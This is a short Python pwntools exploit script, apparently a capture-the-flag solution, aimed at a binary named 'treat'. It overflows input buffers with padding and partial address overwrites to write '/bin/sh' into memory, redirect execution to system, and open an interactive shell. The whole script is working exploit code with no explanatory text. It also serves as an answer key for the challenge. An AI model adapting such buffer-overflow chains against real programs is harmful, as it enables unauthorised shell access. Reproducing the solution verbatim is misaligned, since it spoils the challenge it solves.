from pwn import *

e = ELF("./treat")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)


padd = "A" * 0x800
p.sendlineafter("name :", padd + "A" * 8 * 3 + "/bin/sh")
p.sendlineafter(":", "1" * 0x50 + p64(0x4012c4)[:3])
p.sendlineafter(":", "1" * 0x48 + p64(0x4016a4)[:3])

p.sendlineafter("name :", padd + "A" * 8 * 2 + p64(e.symbols["system"])[:3])
p.sendlineafter(":", "1" * 0x50 + p64(0x4012c4)[:3])
p.sendlineafter(":", "1" * 0x48 + p64(0x4016a4)[:3])

p.sendlineafter("name :", padd + "A" * 8 + p64(0x405080 +3 * 8 + len(padd))[:3])
p.sendlineafter(":", "1" * 0x50 + p64(0x4012c4)[:3])
p.sendlineafter(":", "1" * 0x48 + p64(0x4016a4)[:3])

p.sendlineafter("name :", padd + p64(0x4016a3)[:3])
p.sendlineafter(":", "1" * 0x48 + p64(0x401631)[:3])
p.sendlineafter(":", "A" * 0x40 + p64(0x405080 + len(padd) - 8)[:3])

p.interactive()
